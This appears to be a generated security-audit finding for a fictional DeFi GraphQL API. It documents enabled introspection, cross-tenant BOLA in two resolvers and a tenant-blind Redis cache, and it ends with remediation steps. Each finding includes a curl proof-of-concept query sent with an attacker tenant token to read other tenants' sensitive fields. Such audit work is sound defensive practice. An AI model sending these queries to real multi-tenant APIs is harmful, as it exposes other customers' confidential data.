## System

- System: ChainVault DeFi API v5.1.8
- Domain: BLOCKCHAIN / DeFi
- Example ID: GQL-0435
- Risk ID: RISK-GQL-435

## Findings

### 1. Pattern 6.1 — Introspection Exposes DeFi Schema (Primary Pattern Enabler)

**Pattern 6.1 (Schema/Relationship Over-Exposure)**: GraphQL introspection is enabled in production (Section 5.0). Introspection reveals `sensitiveField`, `internalNotes`, `auditLog`, and relationship paths (`items`, `data.auditLog`) to any authenticated attacker. For DeFi, this discloses wallet data fields, internal DeFi protocol notes, audit trail structure, and all BOLA-exploitable resource types before any data is accessed.

```bash
curl -s -X POST https://api.chainvault-defi-api.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-53DD>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-53dd" \
  -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}'
```

Vulnerable: Full schema returned — `sensitiveField`, `internalNotes`, `auditLog` field names exposed. Reveals `bulkResourceLookup`, `listResources(tenantId:)`, `getResourceWithChildren` for subsequent exploitation.

### 2. Bulk Cross-Tenant DeFi Resource Enumeration — `bulkResourceLookup` (HAR Primary)

**HAR evidence**: JWT `x-tenant-id: tenant-53dd`. Request: `bulkResourceLookup(ids: ["R-2435", "R-1435", "R-3435"])`. Response: HTTP 200 with `tenantId: "tenant-6f9d"`, `sensitiveField: "CONFIDENTIAL-53dd6f9d"`, `internalNotes: "Internal data exposed"`. Section 4.0: "bulkResourceLookup mutation accepts an arbitrary array of IDs without per-ID ownership filtering."

```bash
curl -s -X POST https://api.chainvault-defi-api.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-53DD>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-53dd" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2435\", \"R-1435\", \"R-3435\"]) { resourceId tenantId ownerId data { sensitiveField internalNotes auditLog { ... on AuditEntry { action } } } } }"}'
```

Vulnerable: Returns DeFi resources from `tenant-6f9d` including `sensitiveField` and `internalNotes`.  
Note: HAR response body shows `getResource` shape — synthetic artifact of the test harness. The demonstrated `bulkResourceLookup` BOLA is the primary attack.

### 3. Single-ID Cross-Tenant Read — `getResource` (RISK-GQL-435)

Section 4.0 (RISK-GQL-435): "`getResource` resolver fetches by `resourceId` only. The resolver does NOT verify that the fetched object's `tenantId` matches the JWT's `tenantId`."

```bash
curl -s -X POST https://api.chainvault-defi-api.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-53DD>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-53dd" \
  -d '{"query": "query { getResource(id: \"R-2435\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```

Vulnerable: Returns `tenantId: "tenant-6f9d"`, `sensitiveField`, `internalNotes`.  
Secure: HTTP 403/404 or `{"errors": [{"message": "Forbidden"}], "data": {"getResource": null}}`.

### 4. Redis Cache BOLA

Section 2.0: "Redis cache keyed by `resourceId` (NOTE: no user dimension in cache key)." Any `tenant-53dd` user requesting `R-2435` after `tenant-6f9d` first populated the cache will receive `tenant-6f9d`'s DeFi data directly from cache.

```bash
curl -s -X POST https://api.chainvault-defi-api.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-53DD>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-53dd" \
  -d '{"query": "query { getResource(id: \"R-2435\") { resourceId tenantId data { sensitiveField } } }"}'
```

Cache key `R-2435` returns `tenant-6f9d`'s DeFi data regardless of requestor.

## Evidence

- **HAR**: `bulkResourceLookup(ids: ["R-2435", "R-1435", "R-3435"])` with `tenant-53dd` JWT → HTTP 200 → `tenantId: "tenant-6f9d"`, `sensitiveField`, `internalNotes`.
- **Section 5.0**: GraphQL introspection enabled in production (Pattern 6.1 primary).
- **Section 4.0 (RISK-GQL-435)**: `getResource` resolver lacks tenant check.
- **Section 4.0**: `bulkResourceLookup` has no per-ID ownership filtering.
- **Section 2.0**: Redis cache keyed by `resourceId` only — no user/tenant dimension.

## Remediation

- **Disable introspection in production**: `introspection: false` in Apollo Server config.
- **Resolver-level tenant check**: `WHERE resourceId = $id AND tenant_id = $jwtTenantId` in every resolver (RISK-GQL-435, unblock pending remediation).
- **Per-ID ownership filter in `bulkResourceLookup`**: post-fetch filter returning only `tenantId === jwtTenantId` items.
- **Fix Redis cache key**: include `tenantId` and `userId` in cache key (e.g., `resource:{tenantId}:{resourceId}`).
- **Regression test**: Tenant A token requests Tenant B `resourceId` — assert 403/null.
